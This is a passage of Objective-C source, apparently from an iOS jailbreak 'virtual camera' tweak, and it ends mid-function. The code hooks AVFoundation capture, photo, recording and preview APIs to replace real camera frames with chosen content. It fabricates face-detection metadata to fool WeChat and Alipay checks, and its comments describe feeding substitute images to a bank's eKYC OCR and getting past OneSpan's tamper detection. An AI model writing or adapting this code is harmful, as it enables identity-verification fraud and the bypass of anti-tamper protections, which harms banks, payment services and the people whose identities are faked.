static void vcam_hookPhotoCaptureOnClass(Class cls) {
    if (!cls) return;
    NSString *cn = NSStringFromClass(cls);
    @synchronized(gHookedPhotoCaptureClasses) {
        if (!gHookedPhotoCaptureClasses) gHookedPhotoCaptureClasses = [NSMutableSet new];
        if ([gHookedPhotoCaptureClasses containsObject:cn]) return;
        [gHookedPhotoCaptureClasses addObject:cn];
    }
    SEL sel = @selector(capturePhotoWithSettings:delegate:);
    Method m = class_getInstanceMethod(cls, sel);
    if (m) {
        typedef void (*F)(id, SEL, AVCapturePhotoSettings *, id);
        __block F orig = NULL;
        IMP ni = imp_implementationWithBlock(^(id _self, AVCapturePhotoSettings *settings, id delegate) {
            @try {
                if (vcam_isEnabled()) gLastCaptureTime = CACurrentMediaTime();
                if (delegate) {
                    Class dcls = object_getClass(delegate);
                    vcam_log([NSString stringWithFormat:@"capturePhoto delegate: %@", NSStringFromClass(dcls)]);
                    vcam_hookPhotoDelegate(dcls);
                }
                vcam_hookPHAsset();
            } @catch (NSException *e) {}
            if (orig) orig(_self, sel, settings, delegate);
        });
        IMP origIMP = NULL;
        @try { MSHookMessageEx(cls, sel, ni, &origIMP); } @catch (NSException *e) {}
        if (origIMP) {
            orig = (F)origIMP;
            vcam_log([NSString stringWithFormat:@"capturePhotoWithSettings hooked on %@ (MSHookMessageEx)", cn]);
        } else {
            orig = (F)method_getImplementation(m);
            method_setImplementation(m, ni);
            vcam_log([NSString stringWithFormat:@"capturePhotoWithSettings hooked on %@ (method_setImplementation)", cn]);
        }
    } else {
        vcam_log([NSString stringWithFormat:@"capturePhotoWithSettings NOT found on %@", cn]);
    }

    // iOS 10 legacy CLASS method: +JPEGPhotoDataRepresentationForJPEGSampleBuffer:previewPhotoSampleBuffer:
    // Hyakugo / OneSpan-wrapped Liquid SDK uses this to convert photo SB → JPEG bytes that OCR consumes.
    // vcam123 hooks this; we did NOT before. Returning our JPEG here bypasses the entire photo-internals
    // path — OCR sees our content directly.
    {
        SEL jsel = @selector(JPEGPhotoDataRepresentationForJPEGSampleBuffer:previewPhotoSampleBuffer:);
        Class metaCls = object_getClass(cls);
        Method jm = class_getInstanceMethod(metaCls, jsel);
        if (jm) {
            typedef NSData *(*JF)(Class, SEL, CMSampleBufferRef, CMSampleBufferRef);
            JF jorig = (JF)method_getImplementation(jm);
            IMP nj = imp_implementationWithBlock(^NSData *(Class _self, CMSampleBufferRef jpegSb, CMSampleBufferRef previewSb) {
                @try {
                    if (vcam_isEnabled() && vcam_isBufferReplaceWhitelisted()) {
                        // Determine target dims from the original JPEG SB if available
                        size_t tw = 0, th = 0;
                        if (jpegSb) {
                            CVImageBufferRef pb = CMSampleBufferGetImageBuffer(jpegSb);
                            if (pb) { tw = CVPixelBufferGetWidth(pb); th = CVPixelBufferGetHeight(pb); }
                        }
                        if (tw < 64 || th < 64) { tw = gLastPhotoW > 0 ? gLastPhotoW : 1920; th = gLastPhotoH > 0 ? gLastPhotoH : 1080; }
                        NSData *jpeg = vcam_buildReplacementJPEG(tw, th);
                        if (jpeg) {
                            vcam_log([NSString stringWithFormat:@"+JPEG class hook: replaced %zux%zu -> %lu bytes",
                                tw, th, (unsigned long)jpeg.length]);
                            return jpeg;
                        }
                        vcam_log(@"+JPEG class hook: build failed, falling back to orig");
                    }
                } @catch (NSException *e) {
                    vcam_log([NSString stringWithFormat:@"+JPEG class hook exception: %@", e]);
                }
                return jorig ? jorig(_self, jsel, jpegSb, previewSb) : nil;
            });
            method_setImplementation(jm, nj);
            vcam_log([NSString stringWithFormat:@"+JPEGPhotoDataRepresentation... hooked on %@", cn]);
        }
    }
}

// Hook AVCaptureMetadataOutput delegate to inject fake face metadata
static NSMutableSet *gMetaHookedIMPs = nil;
typedef void (*OrigMetaDelegateIMP)(id, SEL, id, NSArray *, id);

// Create a fake AVMetadataFaceObject with working bounds/faceID
// AVMetadataObject.bounds is read-only in public API, so we use runtime subclass
static Class gFakeFaceClass = nil;
static CGRect gFakeFaceBounds = {{0.25, 0.2}, {0.5, 0.5}};

static id vcam_createFakeFace(void) {
    @try {
        Class baseCls = objc_getClass("AVMetadataFaceObject");
        if (!baseCls) return nil;

        // Create subclass once
        if (!gFakeFaceClass) {
            gFakeFaceClass = objc_allocateClassPair(baseCls, "VCFakeFace", 0);
            if (!gFakeFaceClass) {
                // Class name may already exist, try to get it
                gFakeFaceClass = objc_getClass("VCFakeFace");
                if (!gFakeFaceClass) return nil;
            } else {
                // Override -bounds to return our fake bounds
                class_addMethod(gFakeFaceClass, @selector(bounds),
                    imp_implementationWithBlock(^CGRect(id _self) {
                        return gFakeFaceBounds;
                    }), "{CGRect={CGPoint=dd}{CGSize=dd}}@:");

                // Override -faceID
                class_addMethod(gFakeFaceClass, @selector(faceID),
                    imp_implementationWithBlock(^NSInteger(id _self) {
                        return 1;
                    }), "q@:");

                // Override -type to return AVMetadataObjectTypeFace
                class_addMethod(gFakeFaceClass, @selector(type),
                    imp_implementationWithBlock(^NSString *(id _self) {
                        return @"face";
                    }), "@@:");

                // Override -hasRollAngle / -hasYawAngle
                class_addMethod(gFakeFaceClass, @selector(hasRollAngle),
                    imp_implementationWithBlock(^BOOL(id _self) { return YES; }), "B@:");
                class_addMethod(gFakeFaceClass, @selector(hasYawAngle),
                    imp_implementationWithBlock(^BOOL(id _self) { return YES; }), "B@:");
                class_addMethod(gFakeFaceClass, @selector(rollAngle),
                    imp_implementationWithBlock(^CGFloat(id _self) { return 0.0; }), "d@:");
                class_addMethod(gFakeFaceClass, @selector(yawAngle),
                    imp_implementationWithBlock(^CGFloat(id _self) { return 0.0; }), "d@:");

                objc_registerClassPair(gFakeFaceClass);
                vcam_log(@"Created VCFakeFace subclass");
            }
        }

        id fakeFace = [[gFakeFaceClass alloc] init];
        return fakeFace;
    } @catch (NSException *e) {
        return nil;
    }
}

static void vcam_hookMetadataDelegate(Class dcls) {
    @try {
        if (!dcls) return;
        SEL ds = @selector(captureOutput:didOutputMetadataObjects:fromConnection:);
        Method dm = class_getInstanceMethod(dcls, ds);

        static dispatch_once_t once;
        dispatch_once(&once, ^{ gMetaHookedIMPs = [NSMutableSet new]; });

        if (!dm) {
            vcam_log([NSString stringWithFormat:@"MetadataDelegate method not found on: %@", NSStringFromClass(dcls)]);
            return;
        }

        IMP cur = method_getImplementation(dm);
        @synchronized(gMetaHookedIMPs) {
            if ([gMetaHookedIMPs containsObject:@((uintptr_t)cur)]) return;
        }

        class_addMethod(dcls, ds, cur, method_getTypeEncoding(dm));
        dm = class_getInstanceMethod(dcls, ds);
        cur = method_getImplementation(dm);

        IMP *store = (IMP *)calloc(1, sizeof(IMP));
        if (!store) return;
        *store = cur;
        SEL cs = ds;

        IMP hook = imp_implementationWithBlock(
            ^(id _s, id output, NSArray *objects, id connection) {
                @try {
                    OrigMetaDelegateIMP fn = (OrigMetaDelegateIMP)(*store);
                    if (!fn) return;

                    if (vcam_isEnabled() && objects.count == 0) {
                        // Hardware reports no face — inject fake AVMetadataFaceObject
                        id fakeFace = vcam_createFakeFace();
                        if (fakeFace) {
                            fn(_s, cs, output, @[fakeFace], connection);
                            return;
                        }
                    }
                    fn(_s, cs, output, objects, connection);
                } @catch (NSException *e) {}
            });

        method_setImplementation(dm, hook);
        @synchronized(gMetaHookedIMPs) {
            [gMetaHookedIMPs addObject:@((uintptr_t)hook)];
        }
        vcam_log([NSString stringWithFormat:@"Hooked MetadataOutput delegate: %@", NSStringFromClass(dcls)]);
    } @catch (NSException *e) {}
}

static void vcam_installHooks(void) {
    // 1. AVCaptureVideoDataOutput -setSampleBufferDelegate:queue:
    //    Use MSHookMessageEx (vcam123 同款) — bypasses OneSpan's libobjc tamper detection.
    {
        Class cls = objc_getClass("AVCaptureVideoDataOutput");
        SEL sel = @selector(setSampleBufferDelegate:queue:);
        Method m = cls ? class_getInstanceMethod(cls, sel) : NULL;
        if (m) {
            typedef void (*F)(id, SEL, id, dispatch_queue_t);
            __block F orig = NULL;
            IMP ni = imp_implementationWithBlock(^(id _self, id delegate, dispatch_queue_t queue) {
                @try {
                    if (delegate) {
                        Class dcls = object_getClass(delegate);
                        NSString *cn = NSStringFromClass(dcls);
                        SEL ds = @selector(captureOutput:didOutputSampleBuffer:fromConnection:);
                        Method dm = class_getInstanceMethod(dcls, ds);
                        IMP di = dm ? method_getImplementation(dm) : NULL;
                        BOOL isOurs = NO;
                        @synchronized(gHookIMPs) { isOurs = [gHookIMPs containsObject:@((uintptr_t)di)]; }
                        vcam_log([NSString stringWithFormat:@"setDelegate: %@ IMP=%p ours=%@", cn, di, isOurs ? @"Y" : @"N"]);
                        if (!dm) {
                            vcam_isaSwizzleDelegate(delegate);
                        } else {
                            vcam_hookClass(dcls);
                        }
                    }
                } @catch (NSException *e) {}
                if (orig) orig(_self, sel, delegate, queue);
            });
            IMP origIMP = NULL;
            @try { MSHookMessageEx(cls, sel, ni, &origIMP); } @catch (NSException *e) {}
            if (origIMP) {
                orig = (F)origIMP;
                vcam_log(@"setSampleBufferDelegate hooked via MSHookMessageEx");
            } else {
                // Fallback to method_setImplementation
                orig = (F)method_getImplementation(m);
                method_setImplementation(m, ni);
                vcam_log(@"setSampleBufferDelegate hooked via method_setImplementation (fallback)");
            }
        }
    }
    // 2. AVCaptureSession -startRunning
    {
        Class cls = objc_getClass("AVCaptureSession");
        SEL sel = @selector(startRunning);
        Method m = cls ? class_getInstanceMethod(cls, sel) : NULL;
        if (m) {
            typedef void (*F)(id, SEL);
            __block F orig = NULL;
            IMP ni = imp_implementationWithBlock(^(id _self) {
                if (orig) orig(_self, sel);
                gCameraSessionActive = YES;
                @try {
                    vcam_log(@"AVCaptureSession startRunning");
                    // Scan all outputs to catch delegates set before our hook
                    void (^scanOutputs)(id) = ^(id session) {
                        @try {
                            Class vdoClass = objc_getClass("AVCaptureVideoDataOutput");
                            if (!vdoClass) return;
                            NSArray *outputs = [session performSelector:@selector(outputs)];
                            for (id output in outputs) {
                                if ([output isKindOfClass:vdoClass]) {
                                    id delegate = [output performSelector:@selector(sampleBufferDelegate)];
                                    if (delegate) {
                                        Class dcls = object_getClass(delegate);
                                        SEL ds = @selector(captureOutput:didOutputSampleBuffer:fromConnection:);
                                        Method dm = class_getInstanceMethod(dcls, ds);
                                        IMP di = dm ? method_getImplementation(dm) : NULL;
                                        BOOL isOurs = NO;
                                        @synchronized(gHookIMPs) { isOurs = [gHookIMPs containsObject:@((uintptr_t)di)]; }
                                        if (!isOurs) {
                                            vcam_log([NSString stringWithFormat:@"scan: found delegate %@ (not hooked), hooking now", NSStringFromClass(dcls)]);
                                            if (!dm) {
                                                vcam_isaSwizzleDelegate(delegate);
                                            } else {
                                                vcam_hookClass(dcls);
                                            }
                                        }
                                    }
                                }
                            }
                        } @catch (NSException *e) {}
                    };
                    // Immediate scan
                    scanOutputs(_self);
                    // Delayed scans: catch delegates set after startRunning
                    __weak id weakSelf = _self;
                    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.5 * NSEC_PER_SEC)),
                        dispatch_get_main_queue(), ^{ if (weakSelf) scanOutputs(weakSelf); });
                    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1.5 * NSEC_PER_SEC)),
                        dispatch_get_main_queue(), ^{ if (weakSelf) scanOutputs(weakSelf); });
                    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(3.0 * NSEC_PER_SEC)),
                        dispatch_get_main_queue(), ^{ if (weakSelf) scanOutputs(weakSelf); });
                } @catch (NSException *e) {}
            });
            IMP origIMP = NULL;
            @try { MSHookMessageEx(cls, sel, ni, &origIMP); } @catch (NSException *e) {}
            if (origIMP) { orig = (F)origIMP; vcam_log(@"startRunning hooked via MSHookMessageEx"); }
            else { orig = (F)method_getImplementation(m); method_setImplementation(m, ni); vcam_log(@"startRunning hooked via method_setImplementation"); }
        }
    }
    // 2b. AVCaptureSession -stopRunning
    {
        Class cls2 = objc_getClass("AVCaptureSession");
        SEL sel2 = @selector(stopRunning);
        Method m2 = cls2 ? class_getInstanceMethod(cls2, sel2) : NULL;
        if (m2) {
            typedef void (*F)(id, SEL);
            __block F orig2 = NULL;
            IMP ni2 = imp_implementationWithBlock(^(id _self) {
                gCameraSessionActive = NO;
                if (orig2) orig2(_self, sel2);
            });
            IMP origIMP2 = NULL;
            @try { MSHookMessageEx(cls2, sel2, ni2, &origIMP2); } @catch (NSException *e) {}
            if (origIMP2) orig2 = (F)origIMP2;
            else { orig2 = (F)method_getImplementation(m2); method_setImplementation(m2, ni2); }
        }
    }
    // Helper: check if current process is WeChat (should skip AVAssetWriter replacement)
    // WeChat recordings (Sight videos) are for sending in chat — use real camera content
    // Camera preview in WeChat still shows virtual content (via captureOutput delegate hook)
    static NSString *_cachedBID = nil;
    static BOOL _isWeChat = NO;
    if (!_cachedBID) {
        _cachedBID = [[NSBundle mainBundle] bundleIdentifier];
        _isWeChat = [_cachedBID containsString:@"tencent.xin"] || [_cachedBID containsString:@"tencent.qy.xin"];
    }

    // 2b2. Hook AVAssetWriterInput appendSampleBuffer: (for apps like WeChat that use AVAssetWriter directly)
    {
        Class cls = objc_getClass("AVAssetWriterInput");
        if (cls) {
            SEL sel = @selector(appendSampleBuffer:);
            Method m = class_getInstanceMethod(cls, sel);
            if (m) {
                typedef BOOL (*F)(id, SEL, CMSampleBufferRef);
                F orig = (F)method_getImplementation(m);
                IMP ni = imp_implementationWithBlock(^BOOL(id _self, CMSampleBufferRef sb) {
                    @try {
                        // Skip our own recorder's writes
                        if (_self == gRecWriterInput) {
                            return orig ? orig(_self, sel, sb) : NO;
                        }
                        // WeChat: only replace when camera is active (recording sight video)
                        // Skip when camera is off (sending video from album — don't re-encode with virtual content)
                        if (_isWeChat && !gCameraSessionActive) {
                            return orig ? orig(_self, sel, sb) : NO;
                        }
                        // Only replace video frames, not audio
                        if (vcam_isEnabled() && sb) {
                            CVImageBufferRef pb = CMSampleBufferGetImageBuffer(sb);
                            if (pb) {
                                vcam_replacePixelBuffer(pb);
                            }
                        }
                    } @catch (NSException *e) {}
                    return orig ? orig(_self, sel, sb) : NO;
                });
                method_setImplementation(m, ni);
                vcam_log(@"Hooked AVAssetWriterInput appendSampleBuffer:");
            }
        }
    }
    // 2b3. Hook AVAssetWriterInputPixelBufferAdaptor appendPixelBuffer:withPresentationTime:
    {
        Class cls = objc_getClass("AVAssetWriterInputPixelBufferAdaptor");
        if (cls) {
            SEL sel = @selector(appendPixelBuffer:withPresentationTime:);
            Method m = class_getInstanceMethod(cls, sel);
            if (m) {
                typedef BOOL (*F)(id, SEL, CVPixelBufferRef, CMTime);
                F orig = (F)method_getImplementation(m);
                IMP ni = imp_implementationWithBlock(^BOOL(id _self, CVPixelBufferRef pb, CMTime pts) {
                    @try {
                        // Skip our own recorder's writes
                        if (_self == gRecWriterAdaptor) {
                            return orig ? orig(_self, sel, pb, pts) : NO;
                        }
                        // WeChat: only replace when camera is active (recording)
                        if (_isWeChat && !gCameraSessionActive) {
                            return orig ? orig(_self, sel, pb, pts) : NO;
                        }
                        if (vcam_isEnabled() && pb) {
                            vcam_replacePixelBuffer(pb);
                        }
                    } @catch (NSException *e) {}
                    return orig ? orig(_self, sel, pb, pts) : NO;
                });
                method_setImplementation(m, ni);
                vcam_log(@"Hooked AVAssetWriterInputPixelBufferAdaptor appendPixelBuffer:");
            }
        }
    }
    // 2c. AVCaptureMovieFileOutput -startRecordingToOutputFileURL:recordingDelegate:
    {
        Class cls = objc_getClass("AVCaptureMovieFileOutput");
        if (cls) {
            // Hook startRecordingToOutputFileURL:recordingDelegate:
            {
                SEL sel = @selector(startRecordingToOutputFileURL:recordingDelegate:);
                Method m = cls ? class_getInstanceMethod(cls, sel) : NULL;
                if (m) {
                    typedef void (*F)(id, SEL, NSURL *, id);
                    F orig = (F)method_getImplementation(m);
                    IMP ni = imp_implementationWithBlock(^(id _self, NSURL *url, id delegate) {
                        @try {
                            if (vcam_isEnabled()) {
                                vcam_log([NSString stringWithFormat:@"REC: MovieFileOutput startRecording → %@", url]);
                                gRecOriginalURL = [url copy];
                                // Get actual recording dimensions from the video connection
                                size_t w = 0, h = 0;
                                @try {
                                    typedef NSArray *(*ConnsF)(id, SEL);
                                    ConnsF connsF = (ConnsF)objc_msgSend;
                                    NSArray *conns = connsF(_self, @selector(connections));
                                    for (id conn in conns) {
                                        typedef id (*OutF)(id, SEL);
                                        OutF outF = (OutF)objc_msgSend;
                                        id out = outF(conn, @selector(output));
                                        if (out == _self) {
                                            // Get dimensions from formatDescription via inputPorts
                                            typedef NSArray *(*PortsF)(id, SEL);
                                            PortsF portsF = (PortsF)objc_msgSend;
                                            NSArray *inputPorts = portsF(conn, @selector(inputPorts));
                                            if (inputPorts && [inputPorts count] > 0) {
                                                id port = [inputPorts objectAtIndex:0];
                                                if ([port respondsToSelector:@selector(formatDescription)]) {
                                                    typedef CMFormatDescriptionRef (*FmtF)(id, SEL);
                                                    FmtF fmtF = (FmtF)objc_msgSend;
                                                    CMFormatDescriptionRef fmt = fmtF(port, @selector(formatDescription));
                                                    if (fmt) {
                                                        CMVideoDimensions dims = CMVideoFormatDescriptionGetDimensions(fmt);
                                                        w = dims.width;
                                                        h = dims.height;
                                                        vcam_log([NSString stringWithFormat:@"REC: format dims %zux%zu", w, h]);
                                                    }
                                                }
                                            }
                                            // Check if video is rotated (portrait mode)
                                            if ([conn respondsToSelector:@selector(videoOrientation)]) {
                                                typedef NSInteger (*OrientF)(id, SEL);
                                                OrientF orientF = (OrientF)objc_msgSend;
                                                NSInteger orient = orientF(conn, @selector(videoOrientation));
                                                vcam_log([NSString stringWithFormat:@"REC: videoOrientation=%ld", (long)orient]);
                                                // Portrait orientations (1=portrait, 2=portraitUpsideDown)
                                                if ((orient == 1 || orient == 2) && w > h) {
                                                    size_t tmp = w; w = h; h = tmp;
                                                    vcam_log([NSString stringWithFormat:@"REC: swapped to portrait %zux%zu", w, h]);
                                                }
                                                // Landscape (3=landscapeRight, 4=landscapeLeft)
                                                if ((orient == 3 || orient == 4) && h > w) {
                                                    size_t tmp = w; w = h; h = tmp;
                                                }
                                            }
                                            break;
                                        }
                                    }
                                } @catch (NSException *e) {
                                    vcam_log([NSString stringWithFormat:@"REC: dims detect err: %@", e]);
                                }
                                if (w == 0 || h == 0) { w = 1080; h = 1920; } // Default portrait
                                vcam_startVirtualRecording(w, h);
                                // Hook the recording delegate to intercept didFinishRecording
                                if (delegate) {
                                    vcam_hookRecordingDelegate(object_getClass(delegate));
                                }
                            }
                        } @catch (NSException *e) {}
                        if (orig) orig(_self, sel, url, delegate);
                    });
                    method_setImplementation(m, ni);
                    vcam_log(@"Hooked AVCaptureMovieFileOutput startRecording");
                }
            }
            // Hook stopRecording
            {
                SEL sel = @selector(stopRecording);
                Method m = cls ? class_getInstanceMethod(cls, sel) : NULL;
                if (m) {
                    typedef void (*F)(id, SEL);
                    F orig = (F)method_getImplementation(m);
                    IMP ni = imp_implementationWithBlock(^(id _self) {
                        @try {
                            if (gIsRecordingVideo) {
                                vcam_log(@"REC: MovieFileOutput stopRecording");
                                vcam_stopVirtualRecording();
                            }
                        } @catch (NSException *e) {}
                        if (orig) orig(_self, sel);
                    });
                    method_setImplementation(m, ni);
                    vcam_log(@"Hooked AVCaptureMovieFileOutput stopRecording");
                }
            }
        }
    }
    // 3-4. SBVolumeControl -increaseVolume / -decreaseVolume
    {
        Class cls = NSClassFromString(@"SBVolumeControl");
        if (cls) {
            {
                SEL sel = @selector(increaseVolume);
                Method m = class_getInstanceMethod(cls, sel);
                if (m) {
                    typedef void (*F)(id, SEL);
                    F orig = (F)method_getImplementation(m);
                    IMP ni = imp_implementationWithBlock(^(id _self) {
                        if (orig) orig(_self, sel);
                        NSTimeInterval now = CACurrentMediaTime(); gLastUpTime = now;
                        if (gLastDownTime > 0 && (now - gLastDownTime) < 1.5) {
                            gLastUpTime = 0; gLastDownTime = 0;
                            dispatch_async(dispatch_get_main_queue(), ^{ vcam_showMenu(); });
                        }
                    });
                    method_setImplementation(m, ni);
                }
            }
            {
                SEL sel = @selector(decreaseVolume);
                Method m = class_getInstanceMethod(cls, sel);
                if (m) {
                    typedef void (*F)(id, SEL);
                    F orig = (F)method_getImplementation(m);
                    IMP ni = imp_implementationWithBlock(^(id _self) {
                        if (orig) orig(_self, sel);
                        NSTimeInterval now = CACurrentMediaTime(); gLastDownTime = now;
                        if (gLastUpTime > 0 && (now - gLastUpTime) < 1.5) {
                            gLastUpTime = 0; gLastDownTime = 0;
                            dispatch_async(dispatch_get_main_queue(), ^{ vcam_showMenu(); });
                        }
                    });
                    method_setImplementation(m, ni);
                }
            }
        }
    }
    // 5. CALayer -addSublayer:
    {
        Class cls = objc_getClass("CALayer");
        SEL sel = @selector(addSublayer:);
        Method m = cls ? class_getInstanceMethod(cls, sel) : NULL;
        if (m) {
            typedef void (*F)(id, SEL, CALayer *);
            F orig = (F)method_getImplementation(m);
            IMP ni = imp_implementationWithBlock(^(id _self, CALayer *layer) {
                if (orig) orig(_self, sel, layer);
                @try {
                    if (!gPreviewLayerClass || ![layer isKindOfClass:gPreviewLayerClass]) return;
                    if (!vcam_isEnabled()) return;
                    vcam_log(@"PreviewLayer detected via addSublayer");
                    [OVLay attachTo:layer];
                } @catch (NSException *e) {}
            });
            method_setImplementation(m, ni);
        }
    }
    // 5b. AVCaptureVideoPreviewLayer -setSession: (catch preview layers not added via addSublayer)
    {
        Class cls = objc_getClass("AVCaptureVideoPreviewLayer");
        if (cls) {
            SEL sel = @selector(setSession:);
            Method m = class_getInstanceMethod(cls, sel);
            if (m) {
                typedef void (*F)(id, SEL, id);
                F orig = (F)method_getImplementation(m);
                IMP ni = imp_implementationWithBlock(^(id _self, id session) {
                    if (orig) orig(_self, sel, session);
                    @try {
                        if (!session) return;
                        if (!vcam_isEnabled()) return;
                        vcam_log(@"PreviewLayer detected via setSession:");
                        [OVLay attachTo:(CALayer *)_self];
                    } @catch (NSException *e) {}
                });
                method_setImplementation(m, ni);
            }
            // 5c. AVCaptureVideoPreviewLayer +layerWithSession:
            SEL sel2 = @selector(layerWithSession:);
            Method m2 = class_getClassMethod(cls, sel2);
            if (m2) {
                typedef id (*F)(id, SEL, id);
                F orig2 = (F)method_getImplementation(m2);
                IMP ni2 = imp_implementationWithBlock(^(id _self, id session) {
                    id layer = orig2 ? orig2(_self, sel2, session) : nil;
                    @try {
                        if (layer && session && vcam_isEnabled()) {
                            vcam_log(@"PreviewLayer detected via layerWithSession:");
                            [OVLay attachTo:(CALayer *)layer];
                        }
                    } @catch (NSException *e) {}
                    return layer;
                });
                method_setImplementation(m2, ni2);
            }
        }
    }
    // 6. AVCapturePhotoOutput -capturePhotoWithSettings:delegate: (base class + dynamic subclass)
    vcam_hookPhotoCaptureOnClass(objc_getClass("AVCapturePhotoOutput"));
    // 6b. AVCaptureSession -addOutput: (detect photo output subclass)
    {
        Class cls = objc_getClass("AVCaptureSession");
        SEL sel = @selector(addOutput:);
        Method m = cls ? class_getInstanceMethod(cls, sel) : NULL;
        if (m) {
            typedef void (*F)(id, SEL, id);
            __block F orig = NULL;
            Class photoBase = objc_getClass("AVCapturePhotoOutput");
            Class vdoClass2 = objc_getClass("AVCaptureVideoDataOutput");
            IMP ni = imp_implementationWithBlock(^(id _self, id output) {
                if (orig) orig(_self, sel, output);
                @try {
                    if (output && photoBase && [output isKindOfClass:photoBase]) {
                        Class realCls = object_getClass(output);
                        vcam_log([NSString stringWithFormat:@"PhotoOutput real class: %@", NSStringFromClass(realCls)]);
                        vcam_hookPhotoCaptureOnClass(realCls);
                    }
                    // Also catch VideoDataOutput delegates added after startRunning
                    if (output && vdoClass2 && [output isKindOfClass:vdoClass2]) {
                        id delegate = [output performSelector:@selector(sampleBufferDelegate)];
                        if (delegate) {
                            Class dcls = object_getClass(delegate);
                            SEL ds = @selector(captureOutput:didOutputSampleBuffer:fromConnection:);
                            Method dm = class_getInstanceMethod(dcls, ds);
                            IMP di = dm ? method_getImplementation(dm) : NULL;
                            BOOL isOurs = NO;
                            @synchronized(gHookIMPs) { isOurs = [gHookIMPs containsObject:@((uintptr_t)di)]; }
                            if (!isOurs) {
                                vcam_log([NSString stringWithFormat:@"addOutput scan: found delegate %@ (not hooked), hooking now", NSStringFromClass(dcls)]);
                                vcam_hookClass(dcls);
                            }
                        }
                    }
                    // Pre-load PHAsset hooks while session is being set up
                    vcam_hookPHAsset();
                } @catch (NSException *e) {}
            });
            IMP origIMP = NULL;
            @try { MSHookMessageEx(cls, sel, ni, &origIMP); } @catch (NSException *e) {}
            if (origIMP) { orig = (F)origIMP; vcam_log(@"addOutput hooked via MSHookMessageEx"); }
            else { orig = (F)method_getImplementation(m); method_setImplementation(m, ni); vcam_log(@"addOutput hooked via method_setImplementation"); }
        }
    }
    // 6c. AVCaptureMetadataOutput — fake face metadata when vcam is enabled
    // WeChat/Alipay use hardware face detection via AVCaptureMetadataOutput.
    // Without this hook, they report "no face detected" even though RGB frames are replaced.
    {
        Class metaCls = objc_getClass("AVCaptureMetadataOutput");
        if (metaCls) {
            SEL sel = @selector(setMetadataObjectsDelegate:queue:);
            Method m = class_getInstanceMethod(metaCls, sel);
            if (m) {
                typedef void (*F)(id, SEL, id, dispatch_queue_t);
                F orig = (F)method_getImplementation(m);
                IMP ni = imp_implementationWithBlock(^(id _self, id delegate, dispatch_queue_t queue) {
                    @try {
                        if (delegate) {
                            vcam_hookMetadataDelegate(object_getClass(delegate));
                        }
                    } @catch (NSException *e) {}
                    if (orig) orig(_self, sel, delegate, queue);
                });
                method_setImplementation(m, ni);
                vcam_log(@"Hooked AVCaptureMetadataOutput setMetadataObjectsDelegate:");
            }
        }
    }
    // 7. AVCapturePhoto data methods hooked via vcam_hookPhotoDataOnClass (constructor + dynamic)
    // 8. AVSampleBufferDisplayLayer -enqueueSampleBuffer:
    {
        Class cls = objc_getClass("AVSampleBufferDisplayLayer");
        SEL sel = @selector(enqueueSampleBuffer:);
        Method m = cls ? class_getInstanceMethod(cls, sel) : NULL;
        if (m) {
            typedef void (*F)(id, SEL, CMSampleBufferRef);
            F orig = (F)method_getImplementation(m);
            IMP ni = imp_implementationWithBlock(^(id _self, CMSampleBufferRef sb) {
                @try {
                    if (vcam_isEnabled() && gCameraSessionActive && sb) vcam_replaceInPlace(sb);
                } @catch (NSException *e) {}
                if (orig) orig(_self, sel, sb);
            });
            method_setImplementation(m, ni);
        }
    }
    // 9. AVCaptureStillImageOutput -captureStillImageAsynchronouslyFromConnection:completionHandler:
    {
        Class cls = objc_getClass("AVCaptureStillImageOutput");
        if (cls) {
            {
                SEL sel = @selector(captureStillImageAsynchronouslyFromConnection:completionHandler:);
                Method m = class_getInstanceMethod(cls, sel);
                if (m) {
                    typedef void (*F)(id, SEL, AVCaptureConnection *, id);
                    F orig = (F)method_getImplementation(m);
                    IMP ni = imp_implementationWithBlock(^(id _self, AVCaptureConnection *conn, void (^handler)(CMSampleBufferRef, NSError *)) {
                        @try {
                            if (vcam_isEnabled() && handler) {
                                vcam_log(@"StillImage capture intercepted");
                                void (^oh)(CMSampleBufferRef, NSError *) = [handler copy];
                                void (^wr)(CMSampleBufferRef, NSError *) = ^(CMSampleBufferRef buf, NSError *err) {
                                    @try {
                                        if (buf && !err) {
                                            BOOL ok = vcam_replaceInPlace(buf);
                                            vcam_log([NSString stringWithFormat:@"StillImage replace=%@", ok ? @"YES" : @"NO"]);
                                        }
                                    } @catch (NSException *e) {}
                                    if (oh) oh(buf, err);
                                };
                                if (orig) orig(_self, sel, conn, wr);
                                return;
                            }
                        } @catch (NSException *e) {}
                        if (orig) orig(_self, sel, conn, handler);
                    });
                    method_setImplementation(m, ni);
                }
            }
            // 10. AVCaptureStillImageOutput +jpegStillImageNSDataRepresentation: (class method)
            {
                SEL sel = @selector(jpegStillImageNSDataRepresentation:);
                Method m = class_getClassMethod(cls, sel);
                if (m) {
                    typedef NSData *(*F)(id, SEL, CMSampleBufferRef);
                    F orig = (F)method_getImplementation(m);
                    IMP ni = imp_implementationWithBlock(^NSData *(id _self, CMSampleBufferRef sb) {
                        @try {
                            if (vcam_isEnabled()) {
                                NSData *data = vcam_currentFrameAsJPEG();
                                if (data) { vcam_log(@"StillImage JPEG replaced"); return data; }
                            }
                        } @catch (NSException *e) {}
                        return orig ? orig(_self, sel, sb) : nil;
                    });
                    method_setImplementation(m, ni);
                }
            }
        }
    }
}

// Lazy hook for PHAssetCreationRequest (Photos framework may not be loaded at constructor time)
static BOOL gPHAssetHooked = NO;
static void vcam_hookPHAsset(void) {
    if (gPHAssetHooked) return;
    vcam_log(@"vcam_hookPHAsset called");
    void *h = dlopen("/System/Library/Frameworks/Photos.framework/Photos", RTLD_LAZY);
    vcam_log([NSString stringWithFormat:@"Photos dlopen: %@", h ? @"OK" : @"FAIL"]);
    gPHAssetHooked = YES;

    // Hook PHAssetCreationRequest -addResourceWithType:data:options:
    Class crCls = objc_getClass("PHAssetCreationRequest");
    if (crCls) {
        {
            SEL sel = @selector(addResourceWithType:data:options:);
            Method m = class_getInstanceMethod(crCls, sel);
            if (m) {
                typedef void (*F)(id, SEL, NSInteger, NSData *, id);
                F orig = (F)method_getImplementation(m);
                IMP ni = imp_implementationWithBlock(^(id _self, NSInteger type, NSData *data, id options) {
                    vcam_log([NSString stringWithFormat:@"PHAsset addResource:data type=%ld len=%lu", (long)type, (unsigned long)data.length]);
                    @try {
                        if (vcam_isEnabled()) {
                            // Video resource via data — redirect to virtual recording file
                            if ((type == 2 || type == 6 || type == 9 || type == 10) && gVirtualRecordingURL) {
                                NSData *vData = [NSData dataWithContentsOfURL:gVirtualRecordingURL];
                                if (vData && vData.length > 0) {
